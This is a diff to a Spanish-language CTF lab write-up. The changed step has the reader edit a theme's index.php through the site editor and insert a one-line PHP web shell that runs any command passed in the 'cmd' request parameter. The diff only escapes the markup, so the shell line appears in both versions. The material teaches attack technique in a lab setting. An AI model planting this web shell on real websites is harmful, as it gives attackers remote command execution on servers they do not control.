@@ -64,7 +64,8 @@ Dentro de esta ventana, en **Theme Files** seleccionamos *index.php*:
 
   ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/08d65946-12fe-4dab-a136-93a0162f7664)
 
-Editamos el código existente e insertamos lo siguiente: **<?php echo "<pre>". shell_exec($_REQUEST['cmd']). "</pre>" ?>**
+Editamos el código existente e insertamos lo siguiente: **&lt;?php echo "&lt;pre&gt;". shell_exec($_REQUEST['cmd']). "&lt;/pre&gt;" ?&gt;**
+
 
   ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/f49759eb-c2d0-4c73-ada0-32f7ead3abc3)
 
